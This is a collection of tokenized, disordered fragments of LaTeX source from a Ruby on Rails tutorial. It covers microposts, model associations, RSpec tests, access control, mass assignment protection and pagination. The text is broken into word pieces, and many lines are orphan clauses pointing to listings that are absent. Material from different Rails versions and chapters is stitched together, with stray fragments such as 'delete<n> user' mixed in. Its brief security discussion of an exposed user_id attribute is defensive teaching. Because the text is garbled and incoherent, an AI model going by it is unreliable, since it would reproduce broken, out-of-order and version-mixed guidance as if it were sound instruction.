▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signin _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action }.
▁To ▁implement ▁the ▁forwarding ▁behavior ▁show n ▁in ▁F igure ~\ ref { fig : signin _ page _ protected _ mockup _ bootstrap }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁in ▁Listing ~\ ref { code : user _ signout _ test }.
▁from ▁Listing ~\ ref { code : test _ helper _ sign _ in } ▁to
▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ signed _ in }.
▁in ▁Listing ~\ ref { code : edit _ tests _ signed _ in }.
▁The ▁result ing ▁data ▁model ▁appears ▁in ▁F igure ~\ ref { fig : user _ model _ admin _ 3 r d _ edit ion }.
▁As ▁in ▁Section ~\ ref { sec : requiring _ signed _ in _ users } ▁and ▁Section ~\ ref { sec : requiring _ the _ right _ user }, ▁we ' ll ▁enforce ▁access ▁control ▁using ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁Follow ing ▁the ▁practice ▁from ▁Section ~\ ref { sec : requiring _ signed _ in _ users }, ▁we ' ll ▁put ▁action - level ▁tests ▁of ▁access ▁control ▁in ▁the ▁Users ▁controller ▁test ▁file .
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁user .
▁This ▁automatically ▁ensure s ▁that ▁we ▁find ▁only ▁microposts ▁ belonging ▁to ▁the ▁current ▁user .
▁in ▁Listing ~\ ref { code : signin _ form _ html }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ signin _ test _ valid _ information }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ in _ with _ remember }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ out _ with _ forget }.
▁in ▁Listing ~\ ref { code : remember _ me _ checkbox }.
▁in ▁Listing ~\ ref { code : signin _ create _ user _ instance } ▁and
▁in ▁Listing ~\ ref { code : activation _ token _ test }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ model _ activation _ code }
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ fixture _ reset _ token }.
▁The ▁result ing ▁a ug ment ed ▁data ▁model ▁for ▁microposts ▁appears ▁in ▁F igure ~\ ref { fig : micropost _ model _ image }.
▁in ▁Listing ~\ ref { code : add _ remember _ token _ to _ users }.
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides . rubyonrails . org / active _ record _ callback s . html }{ d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁G u id es }.
▁in ▁Listing ~\ ref { code : sign _ in _ function }.
▁in ▁Listing ~\ ref { code : generated _ user _ fixtures }.
▁in ▁Listing ~\ ref { code : user _ signin _ test _ valid _ information }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ sign _ in }.
▁as ▁seen ▁in ▁Listing ~\ ref { code : cookie _ sign _ in }.
▁With ▁the ▁code ▁in ▁this ▁section , ▁our ▁Micropost ▁model ▁and ▁interface ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁Because ▁the ▁data ▁model ▁has ▁changed ▁through ▁the ▁addition ▁of ▁the ▁\ k ode { microposts } ▁table , ▁you ▁will ▁also ▁need ▁to ▁ migrate ▁the ▁production ▁database :
▁We ' ve ▁covered ▁enough ▁material ▁now ▁that ▁there ▁is ▁a ▁com bin a to rial ▁ ex p lo s ion ▁of ▁possible ▁extensions ▁to ▁the ▁application .
▁Be low ▁are ▁just ▁a ▁few ▁of ▁the ▁many ▁possibilities .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ digest _ s h o ul d _ not _ be _ blank }
▁< n > ▁x ▁= ▁x ▁ + ▁1
▁delete < n > ▁user
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar v al ▁form ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁the n ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : micropost _ images }, ▁uploaded ▁images ).
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁I ▁suggest ▁making ▁a ▁topic ▁branch ▁as ▁usual :
▁as ▁show n ▁in ▁Listing ~\ ref { code : initial _ micropost _ spec }.
▁The ▁initial ▁Micropost ▁spec .
▁We ▁can ▁get ▁these ▁tests ▁to ▁pass ▁by ▁running ▁the ▁microposts ▁migration ▁and ▁prepar ing ▁the ▁test ▁database :
▁You ▁should ▁verify ▁that ▁the ▁tests ▁pass :
▁Even ▁though ▁the ▁tests ▁are ▁passing , ▁you ▁m ight ▁have ▁notice d ▁this ▁code :
▁The ▁comment ▁indicates ▁that ▁the ▁code ▁in ▁the ▁\ k ode { before } ▁block ▁is ▁not ▁idiomatic ally ▁correct .
▁That ▁is , ▁it ▁works , ▁but ▁it ' s ▁not ▁the ▁Rails ▁way .
▁See ▁if ▁you ▁can ▁guess ▁why .
▁S ince ▁this ▁will ▁involve ▁a ▁minor ▁refactoring , ▁in ▁this ▁section ▁we ' ll ▁write ▁a ▁test ▁to ▁catch ▁any ▁future ▁re gr es s ion s .
▁This ▁code ▁requires ▁that ▁the ▁micropost ▁be ▁valid ▁and ▁tests ▁for ▁the ▁presence ▁of ▁the ▁\ k ode { user \_ id } ▁attribute .
▁Now ▁we ' re ▁prepared ▁to ▁see ▁why
▁is ▁wrong .
▁The ▁problem ▁is ▁that ▁by ▁default ▁( as ▁of ▁Rails ~3 . 2 . 3 ) ▁\ emph { all } ▁of ▁the ▁attributes ▁for ▁our ▁Micropost ▁model ▁are ▁accessible .
▁For ▁example , ▁a ▁ malicious ▁user ▁could ▁change ▁the ▁\ k ode { user \_ id } ▁attributes ▁on ▁microposts , ▁there by ▁associat ing ▁microposts ▁with ▁the ▁wrong ▁users .
▁This ▁means ▁that ▁we ▁should ▁remove ▁\ k ode { : user \_ id } ▁from ▁the ▁\ k ode { attr \_ accessible } ▁list , ▁and ▁once ▁we ▁do , ▁the ▁code ▁above ▁will ▁fail .
▁Return ▁the ▁User ▁object ▁ associated ▁with ▁the ▁micropost .
▁Return ▁an ▁array ▁of ▁the ▁user ' s ▁microposts .
▁Create ▁a ▁micropost ▁(\ k ode { user \_ id ▁= ▁user . id }).
▁Create ▁a ▁micropost ▁( exception ▁on ▁failure ).
▁Return ▁a ▁new ▁Micropost ▁object ▁(\ k ode { user \_ id ▁= ▁user . id }).
▁This ▁pattern ▁is ▁the ▁canonical ▁way ▁to ▁make ▁a ▁micropost : ▁\ emph { through } ▁its ▁association ▁with ▁a ▁user .
▁When ▁a ▁new ▁micropost ▁is ▁made ▁in ▁this ▁way , ▁its ▁\ k ode { user \_ id } ▁is ▁\ emph { a utomatically } ▁set ▁to ▁the ▁right ▁value .
▁B u il d ing ▁the ▁micropost ▁through ▁the ▁User ▁association ▁does n ' t ▁fix ▁the ▁security ▁problem ▁of ▁ having ▁an ▁accessible ▁\ k ode { user \_ id }, ▁and
▁as ▁show n ▁in ▁Listing ~\ ref { code : attr _ accessible _ user _ id _ test }.
▁A ▁test ▁to ▁ensure ▁that ▁the ▁\ k ode { user \_ id } ▁is n ' t ▁accessible .
▁This ▁test ▁verifie s ▁that ▁calling ▁\ k ode { Micropost . new } ▁with ▁a ▁non empty ▁\ k ode { user \_ id } ▁raise s ▁a ▁ mass ▁assignment ▁security ▁error ▁exception .
▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ white list }.
▁Ensur ing ▁that ▁Rails ▁throw s ▁errors ▁on ▁invalid ▁ mass ▁assignment .
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ accessible _ attribute }.
▁Mak ing ▁the ▁\ k ode { content } ▁attribute ▁( and ▁\ emph { only } ▁the ▁\ k ode { content } ▁attribute ) ▁accessible .
▁We ▁can ▁test ▁this ▁with ▁the ▁\ k ode { it } ▁and ▁\ k ode { it s } ▁methods ▁as ▁follows :
▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user _ spec }.
▁Tests ▁for ▁the ▁micropost ' s ▁user ▁association .
▁A ▁test ▁for ▁the ▁user ' s ▁\ k ode { microposts } ▁attribute .
▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user _ spec } ▁and
▁You ▁should ▁also ▁check ▁that ▁the ▁tests ▁pass :
▁In ▁this ▁section , ▁we ' ll ▁add ▁\ emph { order ing } ▁and ▁\ emph { dependency } ▁to ▁microposts , ▁while ▁also ▁testing ▁that ▁the ▁\ k ode { user . microposts } ▁method ▁actually ▁returns ▁an ▁array ▁of ▁microposts .
▁We ▁will ▁need ▁to ▁construct ▁some ▁microposts ▁in ▁the ▁User ▁model ▁test , ▁which ▁means ▁that ▁we ▁should ▁make ▁a ▁micropost ▁ factory ▁at ▁this ▁point .
▁To ▁do ▁this , ▁we ▁need ▁a ▁way ▁to ▁make ▁an ▁association ▁in ▁ Factory ▁Girl .
▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ factory }.
▁The ▁complete ▁ factory ▁file , ▁including ▁a ▁new ▁ factory ▁for ▁microposts .
▁Here ▁we ▁tell ▁ Factory ▁Girl ▁about ▁the ▁micropost ' s ▁ associated ▁user ▁just ▁by ▁including ▁a ▁user ▁in ▁the ▁definition ▁of ▁the ▁ factory :
▁As ▁we ' ll ▁see ▁in ▁the ▁next ▁section , ▁this ▁allows ▁us ▁to ▁define ▁ factory ▁microposts ▁as ▁follows :
▁To ▁test ▁this ▁order ing , ▁we ▁first ▁create ▁a ▁couple ▁of ▁microposts ▁as ▁follows :
▁Note ▁how ▁convenient ▁the ▁use ▁of ▁ Factory ▁Girl ▁is : ▁we ▁can ▁set ▁\ k ode { created \_ at } ▁manually , ▁which ▁Active ▁Record ▁won ' t ▁allow ▁us ▁to ▁do .
▁( Re c all ▁that ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁are ▁`` magic '' ▁columns , ▁automatically ▁set ▁to ▁the ▁proper ▁creation ▁and ▁update ▁timestamp s , ▁so ▁any ▁explicit ▁initialization ▁values ▁are ▁over written ▁by ▁the ▁magic .)
▁in ▁Listing ~\ ref { code : micropost _ order ing _ test }.
▁This ▁uses ▁the ▁\ k ode { let ! } ▁( read ▁`` let ▁ bang '') ▁method ▁in ▁place ▁of ▁\ k ode { let } ; ▁the ▁reason ▁is ▁that ▁\ k ode { let } ▁variables ▁are ▁\ emph { la z y }, ▁meaning ▁that ▁they ▁only ▁ spring ▁into ▁exist ence ▁when ▁referenced .
▁The ▁problem ▁is ▁that ▁we ▁want ▁the ▁microposts ▁to ▁exist ▁immediately , ▁so ▁that ▁the ▁timestamp s ▁are ▁in ▁the ▁right ▁order ▁and ▁so ▁that ▁\ k ode {@ user . microposts } ▁is n ' t ▁empty . ▁We ▁accomplish ▁this ▁with ▁\ k ode { let ! }, ▁which ▁force s ▁the ▁corresponding ▁variable ▁to ▁come ▁into ▁exist ence ▁immediately .
▁Testing ▁the ▁order ▁of ▁a ▁user ' s ▁microposts .
▁The ▁key ▁line ▁here ▁is
▁indicat ing ▁that ▁the ▁posts ▁should ▁be ▁order ed ▁new est ▁first .
▁This ▁should ▁fail ▁because ▁by ▁default ▁the ▁posts ▁will ▁be ▁order ed ▁by ~ id , ▁i . e . , ▁\ k ode { [ ol d er \_ micropost , ▁new er \_ micropost ]} .
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ order ing }.
▁ Order ing ▁the ▁microposts ▁with ▁\ k ode { default \_ scope }.
▁The ▁order ▁here ▁is ▁\ k ode { ' created \_ at ▁DESC ' }, ▁where ▁\ k ode { D E S C } ▁is ▁SQL ▁for ▁`` de sc end ing '' , ▁i . e . , ▁in ▁ de sc end ing ▁order ▁from ▁new est ▁to ▁old est .
▁As ▁of ▁Rails ~4.0 , ▁all ▁scope s ▁take ▁an ▁ anonymous ▁function ▁that ▁returns ▁the ▁c r it er i a ▁desired ▁for ▁the ▁scope , ▁main ly ▁so ▁that ▁the ▁scope ▁need ▁not ▁be ▁evaluated ▁immediately , ▁but ▁rather ▁can ▁be ▁loaded ▁later ▁on ▁an ▁as - n e ed ed ▁basis ▁( so - called ▁\ emph { la z y ▁evaluat ion }).
▁The ▁syntax ▁for ▁this ▁kind ▁of ▁object , ▁called ▁a ▁\ emph { Proc } ▁( procedure ) ▁or ▁\ emph { lambda }, ▁is ▁the ▁a r row ~\ k ode { - > }.
▁( Proc s ▁are ▁a ▁some what ▁advanced ▁Ruby ▁topic , ▁so ▁don ' t ▁worry ▁if ▁they ▁don ' t ▁make ▁sense ▁right ▁a way .)
▁Recall ▁from ▁Section ~\ ref { sec : destroy ing _ users } ▁that ▁site ▁administrator s ▁have ▁the ▁power ▁to ▁\ emph { destroy } ▁users .
▁We ▁can ▁test ▁for ▁this ▁by ▁first ▁destroying ▁a ▁micropost ' s ▁user ▁and ▁the n ▁verify ing ▁that ▁the ▁ associated ▁microposts ▁are ▁no ▁longer ▁in ▁the ▁database .
▁In ▁order ▁to ▁test ▁destroying ▁microposts ▁properly , ▁we ▁first ▁need ▁to ▁capture ▁a ▁given ▁user ' s ▁posts ▁in ▁a ▁local ▁variable , ▁and ▁the n ▁destroy ▁the ▁user .
▁A ▁ str a ig h for w ar d ▁implementation ▁look s ▁like ▁this :
▁# ▁ Make ▁sure ▁the ▁micropost ▁does n ' t ▁appear ▁in ▁the ▁database .
▁U nfortunately , ▁this ▁does n ' t ▁work , ▁due ▁to ▁a ▁subtlety ▁about ▁Ruby ▁arrays .
▁ Array ▁assignment ▁in ▁Ruby ▁copie s ▁a ▁\ emph { reference } ▁to ▁the ▁array , ▁not ▁the ▁full ▁array ▁itself , ▁which ▁means ▁that ▁changes ▁to ▁the ▁original ▁array ▁also ▁a ffect ▁the ▁copy .
▁For ▁example , ▁suppose ▁we ▁create ▁an ▁array , ▁assign ▁a ▁second ▁variable ▁to ▁it , ▁and ▁the n ▁reverse ▁the ▁first ▁array ▁in ▁place ▁using ▁the ▁\ k ode { reverse ! }
▁Some what ▁ s up r is ing ly , ▁here ▁\ k ode { b } ▁get s ▁reverse d ▁as ▁well ▁as ▁\ k ode { a }.
▁This ▁is ▁because ▁both ▁\ k ode { a } ▁and ▁\ k ode { b } ▁point ▁to ▁the ▁same ▁array .
▁( The ▁same ▁thing ▁happens ▁with ▁other ▁Ruby ▁data ▁structure s , ▁such ▁as ▁strings ▁and ▁hashes .)
▁In ▁the ▁case ▁of ▁a ▁user ' s ▁microposts , ▁we ▁would ▁have ▁this :
▁( Because ▁we ▁have n ' t ▁implemented ▁the ▁ destruction ▁of ▁ associated ▁microposts ▁yet , ▁this ▁code ▁won ' t ▁current ly ▁work , ▁and ▁is ▁included ▁only ▁to ▁illustrate ▁the ▁principle .)
▁Here ▁we ▁see ▁that ▁destroying ▁a ▁user ▁leave s ▁the ▁\ k ode { microposts } ▁variable ▁with ▁no ▁elements ; ▁i . e . , ▁it ' s ▁the ▁empty ▁array ~\ k ode { [ ]} .
▁This ▁behavior ▁means ▁that ▁we ▁must ▁take ▁great ▁care ▁when ▁making ▁duplicate s ▁of ▁Ruby ▁objects .
▁To ▁duplicate ▁relative ly ▁simple ▁objects ▁such ▁as ▁arrays , ▁we ▁can ▁use ▁the ▁\ k ode { dup } ▁method :
▁( This ▁is ▁known ▁as ▁a ▁`` shallow ▁copy ''.
▁Mak ing ▁a ▁`` deep ▁copy '' ▁is ▁a ▁much ▁more ▁difficult ▁problem , ▁and ▁in ▁fact ▁has ▁no ▁general ▁solution , ▁but ▁ drop p ing ▁`` ruby ▁ deep ▁copy '' ▁into ▁a ▁search ▁engine ▁should ▁be ▁enough ▁to ▁get ▁you ▁started ▁if ▁you ▁need ▁to ▁copy ▁a ▁more ▁complicated ▁structure ▁such ▁as ▁a ▁nested ▁array .)
▁App ly ing ▁the ▁\ k ode { dup } ▁method ▁to ▁the ▁user ' s ▁microposts ▁gives ▁us ▁code ▁like ▁this :
▁Here ▁the ▁call ▁to ▁\ k ode { to \_ a } ▁effective ly ▁make s ▁a ▁copy ▁of ▁the ▁microposts , ▁and ▁we ' ve ▁included ▁the ▁line
▁as ▁a ▁ safety ▁check ▁to ▁catch ▁any ▁errors ▁should ▁the ▁\ k ode { to \_ a } ▁ever ▁be ▁accidental ly ▁removed .
▁The ▁issue ▁is ▁that , ▁without ▁\ k ode { to \_ a }, ▁destroying ▁the ▁user ▁would ▁destroy ▁the ▁posts ▁in ▁the ▁\ k ode { microposts } ▁variable , ▁and ▁as ▁a ▁result
▁would n ' t ▁actually ▁test ▁anything ▁because ▁\ k ode { microposts } ▁would ▁be ▁empty .
▁We ▁can ▁express ▁the ▁expect ation ▁that ▁the ▁microposts ▁don ' t ▁appear ▁in ▁the ▁database ▁as ▁follows :
▁Here ▁we ▁have ▁used ▁\ k ode { Micropost . where } ▁instead ▁of ▁\ k ode { Micropost . find } ▁because ▁it ▁returns ▁an ▁empty ▁object ▁if ▁the ▁record ▁is ▁not ▁found ▁instead ▁of ▁rais ing ▁an ▁exception , ▁which ▁is ▁a ▁little ▁easier ▁to ▁test . ▁(
▁In ▁case ▁you ' re ▁curious , ▁the ▁code
▁does ▁the ▁trick ▁in ▁this ▁case .)
▁Testing ▁that ▁microposts ▁are ▁destroyed ▁when ▁users ▁are .
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ dependency }.
▁With ▁that , ▁the ▁final ▁form ▁of ▁the ▁user / micropost ▁association ▁is ▁in ▁place , ▁and ▁all ▁the ▁tests ▁should ▁be ▁passing :
▁Like ▁the ▁\ k ode { user \_ id }, ▁the ▁\ k ode { content } ▁attribute ▁must ▁be ▁present , ▁and ▁it ▁is ▁further ▁constrain ed ▁to ▁be ▁no ▁longer ▁than ▁ 140 ▁characters , ▁making ▁it ▁an ▁h one st ▁\ emph { micro } post .
▁The ▁application ▁code ▁is ▁a ▁one - line r :
▁in ▁Listing ~\ ref { code : micropost _ validations }.
▁We ▁begin ▁with ▁tests ▁for ▁display ing ▁the ▁user ' s ▁microposts , ▁which ▁we ' ll ▁create ▁in ▁the ▁request ▁spec ▁for ▁Users .
▁Ou r ▁strategy ▁is ▁to ▁create ▁a ▁couple ▁of ▁ factory ▁microposts ▁ associated ▁with ▁the ▁user , ▁and ▁the n ▁verify ▁that ▁the ▁show ▁page ▁contains ▁each ▁post ' s ▁content .
▁To ▁accomplish ▁this , ▁we ▁use ▁the ▁\ k ode { let ! } ▁variant :
▁in ▁Listing ~\ ref { code : user _ show _ microposts _ test }.
▁A ▁test ▁for ▁show ing ▁microposts ▁on ▁the ▁user ▁\ k ode { show } ▁page .
▁Note ▁here ▁that ▁we ▁can ▁use ▁the ▁\ k ode { count } ▁method ▁\ emph { through } ▁the ▁association :
▁The ▁association ▁\ k ode { count } ▁method ▁is ▁smart , ▁and ▁perform s ▁the ▁count ▁directly ▁in ▁the ▁database .
▁In ▁particular , ▁it ▁does ▁\ emph { not } ▁pull ▁all ▁the ▁microposts ▁out ▁of ▁the ▁database ▁and ▁the n ▁call ▁\ k ode { length } ▁on ▁the ▁result ing ▁array , ▁as ▁this ▁could ▁become ▁in efficient ▁as ▁the ▁number ▁of ▁microposts ▁g re w .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ microposts }.
▁< aside >
▁We ' ll ▁deal ▁with ▁the ▁microposts ▁list ▁moment ar ily , ▁but ▁there ▁are ▁sever al ▁other ▁things ▁to ▁note ▁first .
▁In ▁the ▁present ▁case , ▁since ▁we ▁are ▁ still ▁in ▁the ▁Users ▁controller ▁but ▁want ▁to ▁ paginate ▁\ emph { microposts } ▁instead , ▁we ▁pass ▁an ▁explicit ▁\ k ode {@ microposts } ▁variable ▁to ▁\ k ode { will \_ paginate }.
▁F inally , ▁note ▁that ▁we ▁have ▁take n ▁this ▁opportunit y ▁to ▁add ▁a ▁count ▁of ▁the ▁current ▁number ▁of ▁microposts :
▁As ▁noted , ▁\ k ode {@ user . microposts . count } ▁is ▁the ▁an a log ue ▁of ▁the ▁\ k ode { User . count } ▁method , ▁except ▁that ▁it ▁count s ▁the ▁microposts ▁ belonging ▁to ▁a ▁given ▁user ▁through ▁the ▁user / micropost ▁association .
▁We ▁come ▁finally ▁to ▁the ▁micropost ▁list ▁itself :
▁This ▁code , ▁which ▁uses ▁the ▁\ emph { order ed ▁list } ▁tag ~\ k ode { ol }, ▁is ▁responsib le ▁for ▁ generating ▁the ▁list ▁of ▁microposts , ▁but ▁you ▁can ▁see ▁that ▁it ▁just ▁def ers ▁the ▁heav y ▁ li f ting ▁to ▁a ▁micropost ▁partial .
▁Similar ly , ▁the ▁code
▁does ▁exactly ▁the ▁same ▁thing ▁for ▁microposts .
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial }.
▁We ▁the n ▁make ▁50 ▁microposts ▁for ▁each ▁user ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁limit ▁of ~3 0 ), ▁ generating ▁sample ▁content ▁for ▁each ▁micropost ▁using ▁the ▁ Faker ▁gem ' s ▁hand y ▁\ href { http :// ruby doc . info / gem s / fa k er /1 . 3 . 0 / Faker / L or em }{\ text tt { L or em . sentence } ▁method }.
▁Of ▁course , ▁to ▁generate ▁the ▁new ▁sample ▁data ▁we ▁have ▁to ▁run ▁the ▁\ k ode { db : populate } ▁Rake ▁task :
▁F inally , ▁F igure ~\ ref { fig : user _ profile _ microposts _ page _ 2 _ rails _3} ▁shows ▁the ▁\ emph { second } ▁page ▁of ▁microposts ▁for ▁the ▁first ▁user , ▁along ▁with ▁the ▁pagination ▁links ▁at ▁the ▁bottom ▁of ▁the ▁display .
▁There ▁is ▁one ▁break ▁with ▁ past ▁convention ▁worth ▁noting : ▁the ▁interface ▁to ▁the ▁Microposts ▁resource ▁will ▁run ▁principal ly ▁through ▁the ▁Users ▁and ▁StaticPages ▁controllers , ▁so ▁we ▁won ' t ▁need ▁actions ▁like ▁\ k ode { new } ▁or ▁\ k ode { edit } ▁in ▁the ▁Microposts ▁controller ; ▁we ' ll ▁only ▁need ▁\ k ode { create } ▁and ▁\ k ode { destroy }.
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ resource }.
▁\ href { http :// www . michael hartl . com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// www . railstutorial . org / }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁the ▁leading ▁introduction ▁to ▁web ▁development ▁with ▁\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails }.
▁The ▁idea ▁is ▁simple : ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁should ▁require ▁users ▁to ▁be ▁signed ▁in .
▁in ▁Listing ~\ ref { code : micropost _ access _ control }.
▁Access ▁control ▁tests ▁for ▁microposts .
▁In ▁this ▁case , ▁a ▁non - signed - in ▁user ▁is ▁redirect ed ▁upon ▁ submitting ▁a ▁\ text tt { POST } ▁request ▁to ▁/ microposts ▁(\ k ode { post ▁microposts \_ path }, ▁which ▁hit s ▁the ▁\ k ode { create } ▁action ) ▁or ▁ submitting ▁a ▁\ text tt { DELETE } ▁request ▁to ▁/ microposts /1 ▁(\ k ode { delete ▁micropost \_ path ( micropost ) }, ▁which ▁hit s ▁the ▁\ k ode { destroy } ▁action ).
▁Writ ing ▁the ▁application ▁code ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : micropost _ access _ control } ▁to ▁pass ▁requires ▁a ▁little ▁refactoring ▁first .
▁( S ince ▁we ▁did n ' t ▁generate ▁it ▁at ▁the ▁command ▁line , ▁you ▁will ▁have ▁to ▁create ▁the ▁Microposts ▁controller ▁file ▁by ▁hand .)
▁ Adding ▁authentication ▁to ▁the ▁Microposts ▁controller ▁actions .
▁in ▁Listing ~\ ref { code : microposts _ create _ tests }.
▁Tests ▁for ▁creating ▁microposts .
▁in ▁Listing ~\ ref { code : user _ info }< n > and
▁in ▁Listing ~\ ref { code : micropost _ form }.
▁in ▁Listing ~\ ref { code : gravatar _ option }.
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁ungrammatical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁( but ▁`` 2 ▁microposts '') ▁using ▁\ k ode { pluralize }.
▁We ▁should ▁define ▁an ▁error ▁messages ▁partial ▁that ▁works ▁regardless ▁of ▁the ▁kind ▁of ▁object ▁passed ▁to ▁it .
▁H appily , ▁the ▁form ▁variable ~\ k ode { f } ▁can ▁access ▁the ▁ associated ▁object ▁through ▁\ k ode { f . object }, ▁so ▁that ▁in
▁U nfortunately , ▁the ▁User ▁request ▁spec ▁is ▁now ▁broken ▁because ▁the ▁signup ▁and ▁edit ▁forms ▁use ▁the ▁old ▁version ▁of ▁the ▁error ▁messages ▁partial .
▁in ▁Listing ~\ ref { code : signup _ errors _ updated } ▁and
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁passing :
▁S ince ▁each ▁user ▁should ▁have ▁a ▁feed , ▁we ▁are ▁ l ed ▁natural ly ▁to ▁a ▁\ k ode { feed } ▁method ▁in ▁the ▁User ▁model .
▁Even t u ally , ▁we ▁will ▁test ▁that ▁the ▁feed ▁returns ▁the ▁microposts ▁of ▁the ▁users ▁being ▁followed , ▁but ▁for ▁now ▁we ' ll ▁just ▁test ▁that ▁the ▁\ k ode { feed } ▁method ▁\ emph { include s } ▁the ▁current ▁user ' s ▁microposts ▁but ▁\ emph { exclude s } ▁the ▁posts ▁of ▁a ▁different ▁user .
▁Tests ▁for ▁the ▁( proto - ) status ▁feed .
▁These ▁tests ▁introduce ▁( via ▁the ▁RSpec ▁boolean ▁convention ) ▁the ▁array ▁\ k ode { include ?}\ ▁method , ▁which ▁simply ▁check s ▁if ▁an ▁array ▁includes ▁the ▁given ▁element
▁ Learn ing ▁about ▁methods ▁such ▁as ▁\ k ode { include ? }
▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed }.
▁A ▁test ▁for ▁rendering ▁the ▁feed ▁on ▁the ▁Home ▁page .
▁will ▁generate ▁a ▁match ▁for ▁each ▁item .
▁in ▁Listing ~\ ref { code : home _ page _ feed _ test }.
▁At ▁this ▁point , ▁the ▁proto - feed ▁should ▁be ▁working , ▁and ▁the ▁test ▁suite ▁should ▁pass :
▁Tests ▁for ▁the ▁Microposts ▁controller ▁\ k ode { destroy } ▁action .
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ fixture _ password _ reset _ token }.
▁( The ▁call ▁to ▁\ k ode { to \_ s } ▁is ▁to ▁make ▁sure ▁we ▁can ▁handle ▁\ k ode { nil } ▁token s , ▁which ▁should n ' t ▁happen ▁in ▁browsers ▁but ▁some times ▁happens ▁in ▁tests .)
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en . wiki p edia . org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoked ▁at ▁a ▁particular ▁point ▁in ▁the ▁life time ▁of ▁an ▁Active ▁Record ▁object ▁( see ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 1 . 4 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks }).
▁The ▁About ▁page ▁at ▁\ href { http ://0.0.0.0:3000/ about }{/ about }.
▁By ▁the ▁way , ▁previous ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁in ▁place ▁of ▁\ text tt { PATCH }, ▁and ▁Rails ~4.0 ▁ still ▁supports ▁this ▁usage , ▁but ▁\ text tt { PATCH } ▁\ href { http :// web log . rubyonrails . org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ match es ▁the ▁intend ed ▁HTTP ▁usage ▁better } ▁and ▁is ▁preferred ▁for ▁new ▁applications .
▁If ▁these ▁steps ▁seem ▁mysterious , ▁take ▁he ar t : ▁I ' m ▁just ▁following ▁the ▁instructions ▁from ▁the ▁\ href { https :// github . com / t w b s / bootstrap - sass }{ bootstrap - sass ▁README ▁file }.
▁We ▁the n ▁make ▁50 ▁microposts ▁for ▁each ▁user ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁limit ▁of ~3 0 ), ▁ generating ▁sample ▁content ▁for ▁each ▁micropost ▁using ▁the ▁ Faker ▁gem ' s ▁hand y ▁\ href { http :// fa k er . ruby for ge . org / rdoc / classes / Faker / L or em . html }{\ text tt { L or em . sentence } ▁method }.
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : demo _ new _ micropost _ rails _3} .
